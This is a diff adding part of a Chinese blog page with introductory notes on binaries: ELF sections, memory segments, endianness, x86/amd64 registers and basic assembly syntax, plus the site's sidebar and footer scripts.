+<td>包含了可读可写数据</td>
+</tr>
+<tr>
+<td><strong>.text 节</strong></td>
+<td>.data 节</td>
+</tr>
+<tr>
+<td>.rodata 节</td>
+<td>.dynamic 节</td>
+</tr>
+<tr>
+<td>.hash 节</td>
+<td>.got 节</td>
+</tr>
+<tr>
+<td>.dynsym 节</td>
+<td><strong>.got.plt</strong> 节（保存plt节解析出的函数的实际地址）</td>
+</tr>
+<tr>
+<td>.dynstr 节</td>
+<td><strong>.bss 节</strong> （只占用内存的空间不占用磁盘的空间）</td>
+</tr>
+<tr>
+<td><strong>.plt</strong> 节（解析动态链接函数的实际地址）</td>
+<td></td>
+</tr>
+<tr>
+<td>.rel.got 节</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="（5）程序数据是如何在内存中组织的"><a href="#（5）程序数据是如何在内存中组织的" class="headerlink" title="（5）程序数据是如何在内存中组织的"></a>（5）程序数据是如何在内存中组织的</h2><p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/image-20250114203349946.png" alt="image-20250114203349946"></p>
+<p>Data段：放已经初始化的全局变量</p>
+<p>Bss段：放未初始化的全局变量</p>
+<p>Text段：除了防止代码还放只读数据（.rodata）</p>
+<p>Heap段：动态存储区</p>
+<p>Stack段：存放局部变量（随着函数执行完被丢弃）</p>
+<p>注：x,y是形参，当main函数调用sum函数时才会被用到，只有参数传递的时候才会被使用</p>
+<p>32位架构：当main函数调用sum函数时，在创建sum函数的栈帧之前，将x和y的值压栈</p>
+<p>64位架构：x,y不会放在虚拟内存中，而是放在寄存器中</p>
+<h2 id="（6）大端序与小端序"><a href="#（6）大端序与小端序" class="headerlink" title="（6）大端序与小端序"></a>（6）大端序与小端序</h2><p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/image-20250114212210896.png" alt="image-20250114212210896"></p>
+<p>小端序：低地址存放数据低位、高地址存放数据高位（大部分）</p>
+<p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/image-20250118180248328.png" alt="image-20250118180248328"></p>
+<p>大端序：低地址存放数据高位、高地址存放数据低位（小部分）</p>
+<p>注：在C语言中0x00是字符串的结束符，大部分情况数据高位都为0，大端序低地址存放高位数据，数据是从低地址向高地址写，当进行溢出时，从低地址写入遇到0x00就直接结束了，所以小端序比大端序更好利用。</p>
+<h1 id="四、程序的装载与进程的执行"><a href="#四、程序的装载与进程的执行" class="headerlink" title="四、程序的装载与进程的执行"></a>四、程序的装载与进程的执行</h1><h2 id="（1）进程的执行过程"><a href="#（1）进程的执行过程" class="headerlink" title="（1）进程的执行过程"></a>（1）进程的执行过程</h2><p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/image-20250114213905165.png" alt="image-20250114213905165"></p>
+<p>PC寄存器（Register）：存放当前执行指令的地址（process count）</p>
+<p>x86 eip x64 rip </p>
+<h2 id="（2）寄存器"><a href="#（2）寄存器" class="headerlink" title="（2）寄存器"></a>（2）寄存器</h2><p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/image-20250114215650510.png" alt="image-20250114215650510"></p>
+<p>amd64位寄存器结构</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>大小</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>rax</td>
+<td>8Bytes</td>
+</tr>
+<tr>
+<td>eax</td>
+<td>4Bytes</td>
+</tr>
+<tr>
+<td>ax</td>
+<td>2Bytes</td>
+</tr>
+<tr>
+<td>ah</td>
+<td>1Bytes</td>
+</tr>
+<tr>
+<td>al</td>
+<td>1Bytes</td>
+</tr>
+</tbody></table>
+<p>部分寄存器的功能</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>RSP</td>
+<td>存放当前栈帧的栈顶地址</td>
+</tr>
+<tr>
+<td>RBP</td>
+<td>存放当前栈帧的栈底地址</td>
+</tr>
+<tr>
+<td>RAX</td>
+<td>通用寄存器存放函数返回值</td>
+</tr>
+<tr>
+<td>RIP</td>
+<td>存放当前执行的指令的地址</td>
+</tr>
+</tbody></table>
+<h2 id="（3）静态链接的程序的执行过程"><a href="#（3）静态链接的程序的执行过程" class="headerlink" title="（3）静态链接的程序的执行过程"></a>（3）静态链接的程序的执行过程</h2><p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/image-20250114215750912.png" alt="image-20250114215750912"></p>
+<p>user mode：用户代码          hernel mode：操作系统代码</p>
+<h2 id="（4）动态链接的程序的执行过程"><a href="#（4）动态链接的程序的执行过程" class="headerlink" title="（4）动态链接的程序的执行过程"></a>（4）动态链接的程序的执行过程</h2><p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/image-20250114231359629.png" alt="image-20250114231359629"></p>
+<h1 id="五、x86-amd64汇编简述"><a href="#五、x86-amd64汇编简述" class="headerlink" title="五、x86&amp;amd64汇编简述"></a>五、x86&amp;amd64汇编简述</h1><h2 id="（1）常用汇编指令"><a href="#（1）常用汇编指令" class="headerlink" title="（1）常用汇编指令"></a>（1）常用汇编指令</h2><table>
+<thead>
+<tr>
+<th>MOV</th>
+<th>LEA</th>
+<th>PUSH</th>
+<th>POP</th>
+<th>LEAVE</th>
+<th>RET</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>把源操作数传送给目标</td>
+<td>把源操作数的有效地址送给指定的寄存器</td>
+<td>把目标值压栈，同时SP指针-1字长</td>
+<td>将栈顶的值弹出至目的存储位置，同时SP指针+1字长</td>
+<td>在函数返回时，恢复父函数栈帧的指令</td>
+<td>在函数返回时，控制程序执行流返回父函数的指令</td>
+</tr>
+</tbody></table>
+<h2 id="（2）两种汇编格式"><a href="#（2）两种汇编格式" class="headerlink" title="（2）两种汇编格式"></a>（2）两种汇编格式</h2><table>
+<thead>
+<tr>
+<th>intel</th>
+<th>AT&amp;T</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mov eax, 8</td>
+<td>movl $8, %eax</td>
+</tr>
+<tr>
+<td>mov ebx, 0ffffh</td>
+<td>movl $0xffff, %ebx</td>
+</tr>
+<tr>
+<td>int 80h</td>
+<td>int $80</td>
+</tr>
+<tr>
+<td>mov eax, [ecx]</td>
+<td>movl (%ecx), %eax</td>
+</tr>
+</tbody></table>
+<p><img src="/2025/01/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/image-20250207132728553.png" alt="image-20250207132728553"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">和方煜</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">和方煜</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">123k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">1:52</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+// 在最后添加
+<script src="/js/code-unfold.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
